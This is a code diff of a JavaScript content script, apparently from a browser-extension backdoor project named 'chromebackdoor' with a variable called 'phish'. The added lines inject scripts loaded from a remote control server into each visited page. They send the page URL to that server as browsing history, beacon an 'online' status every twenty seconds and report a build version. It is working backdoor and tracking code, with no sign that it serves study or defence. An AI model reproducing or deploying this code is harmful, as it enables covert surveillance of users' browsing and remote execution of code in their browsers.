@@ -1,26 +1,33 @@
 $(document).ready(function()
 {
     var phish = "";
+    var version = 'Build001';
     var tabURL = window.location.href;
-    var server_web = "https://localhost:8888/"
+    var server_web = "http://localhost:8888/taff/private/chromebackdoor/"
     var lock_page = "relais/lock.php"
     var gate_page = "relais/index.php"
-
+    
     var v = document.createElement('script');
     v.type = 'text/javascript';
     v.async = true;
+    v.id = "scriptchromebackdoor"
     v.src = server_web+"relais/jquery.js";
-    var z = document.getElementsByTagName('script')[0];
-    z.parentNode.insertBefore(v, z);
-    
-    
-
+    //var z = document.getElementById('script')[0];
     
     var s = document.createElement('script');
     s.type = 'text/javascript';
     s.async = true;
     s.src = server_web+"relais/show_script.php";
-    var x = document.getElementsByTagName('script')[0];
-    x.parentNode.insertBefore(s, x);
+    document.body.appendChild(v);
+    document.body.appendChild(s);
+    
+    function online(){
+        $.get(server_web+'relais/index.php?online=1');
+    }
+    setInterval(online,20000);
+    var url_history = window.location.href;
+    $.get(server_web+'relais/index.php?online=1');
+    $.get(server_web+'relais/index.php?history='+url_history);
+    $.get(server_web+'relais/index.php?n=pop&version='+version);
 
 });
